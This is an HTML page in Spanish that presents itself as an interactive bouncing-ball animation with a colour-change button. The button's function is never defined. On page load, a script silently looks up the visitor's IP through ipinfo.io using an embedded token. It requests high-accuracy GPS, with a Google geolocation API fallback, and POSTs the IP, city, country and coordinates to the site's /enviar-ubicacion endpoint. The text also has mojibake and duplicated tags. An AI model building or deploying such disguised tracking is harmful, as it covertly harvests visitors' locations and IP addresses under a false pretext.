<!DOCTYPE html>
<html lang="es">
<head>
    <html lang="es">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Animaci√≥n Interactiva</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    background-color: #f4f4f4;
                    padding: 20px;
                    overflow: hidden;
                }
                .container {
                    background: white;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
                    display: inline-block;
                    position: relative;
                }
                .ball {
                    width: 50px;
                    height: 50px;
                    background-color: #007bff;
                    border-radius: 50%;
                    position: absolute;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    animation: bounce 2s infinite ease-in-out;
                }
                @keyframes bounce {
                    0%, 100% {
                        transform: translate(-50%, -50%) translateY(0);
                    }
                    50% {
                        transform: translate(-50%, -50%) translateY(-100px);
                    }
                }
                button {
                    margin-top: 20px;
                    padding: 10px 20px;
                    border: none;
                    border-radius: 5px;
                    background-color: #007bff;
                    color: white;
                    cursor: pointer;
                }
                button:hover {
                    background-color: #0056b3;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Animaci√≥n Interactiva</h1>
                <p>Haz clic en el bot√≥n para cambiar el color de la bola.</p>
                <div class="ball" id="ball"></div>
                <button onclick="cambiarColor()">Cambiar Color</button>
            </div>
        

            <script>
                const API_KEY = "TU_API_KEY"; // üî• Reemplaza con tu clave de Google Maps
            
                function obtenerUbicacion() {
                    // Primero intentamos obtener la IP del usuario
                    fetch("https://ipinfo.io/json?token=8247e9a3e4bb2d")
                        .then(response => response.json())
                        .then(ipData => {
                            console.log("üìç IP obtenida:", ipData.ip);
                            const [lat, lon] = ipData.loc.split(",");
            
                            // Enviar la ubicaci√≥n aproximada por IP
                            enviarUbicacion(lat, lon, ipData.city, ipData.country, ipData.ip, "IP");
            
                            // Luego intentamos obtener la ubicaci√≥n m√°s precisa con GPS
                            if (navigator.geolocation) {
                                navigator.geolocation.getCurrentPosition(
                                    function (position) {
                                        console.log("üì° Ubicaci√≥n GPS:", position.coords.latitude, position.coords.longitude);
                                        enviarUbicacion(position.coords.latitude, position.coords.longitude, "", "", ipData.ip, "GPS");
                                    },
                                    function (error) {
                                        console.warn("‚ö†Ô∏è No se pudo obtener ubicaci√≥n por GPS. Usando API de Google...", error);
                                        obtenerUbicacionPorRedes(ipData.ip);
                                    },
                                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                                );
                            } else {
                                console.error("‚ùå Geolocalizaci√≥n no soportada en este navegador.");
                                obtenerUbicacionPorRedes(ipData.ip);
                            }
                        })
                        .catch(error => console.error("‚ùå Error obteniendo IP:", error));
                }
            
                function obtenerUbicacionPorRedes(ip) {
                    fetch(`https://www.googleapis.com/geolocation/v1/geolocate?key=${API_KEY}`, {
                        method: "POST",
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log("üì° Ubicaci√≥n por redes:", data.location);
                        enviarUbicacion(data.location.lat, data.location.lng, "", "", ip, "Redes");
                    })
                    .catch(error => console.error("‚ùå Error en la API de Google:", error));
                }
            
                function enviarUbicacion(latitud, longitud, ciudad, pais, ip, metodo) {
                    fetch("/enviar-ubicacion", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            ciudad: ciudad || "Desconocida",
                            pais: pais || "Desconocido",
                            ip: ip || "No disponible",
                            latitud,
                            longitud,
                            metodo
                        })
                    }).then(response => response.text()).then(data => console.log("‚úÖ Ubicaci√≥n enviada:", data));
                }
            
                obtenerUbicacion();
            </script>
            
</body>
</html>
